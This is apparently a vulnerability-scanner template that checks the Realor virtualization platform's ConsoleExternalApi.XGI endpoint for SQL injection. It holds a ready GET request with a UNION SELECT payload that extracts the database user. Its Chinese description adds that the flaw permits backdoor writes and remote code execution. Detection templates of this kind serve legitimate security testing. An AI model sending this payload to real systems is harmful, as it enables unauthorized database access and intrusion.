id: realor-console-external-api-xgi-sqli

info:
  name: Realor Console External API XGI SQL Injection
  author: clearlu3
  severity: high
  description: |
    天翼虚拟化平台ConsoleExternalApi.XGI接口存在SQL注入，攻击者可获取数据库敏感信息，写入后门文件实现RCE。
  reference:
    - https://mp.weixin.qq.com/s/XFEqd3YdeQGY9Si08Rv1yg
    - https://mp.weixin.qq.com/s/vGzEkgiEx-4Ojrhm5REtfQ
  metadata:
    verified: true
  tags: Realor,sqli,http

http:
  - method: GET
    path:
      - "{{BaseURL}}/ConsoleExternalApi.XGI?key=inner&initParams=command_getAppVisitLogByDataTable__user_admin__pwd_xxx__serverIdStr_1&sign=0a3d5f4f69628f32217ea9704d12bd6d&iDisplayStart=1%2Bunion%2Bselect%2B1%2C2%2C3%2C4%2C5%2Cuser()%23"

    matchers:
      - type: word
        words:
          - "iTotalRecords"
          - "iTotalDisplayRecords"
        condition: and
        part: body

    matchers-condition: and
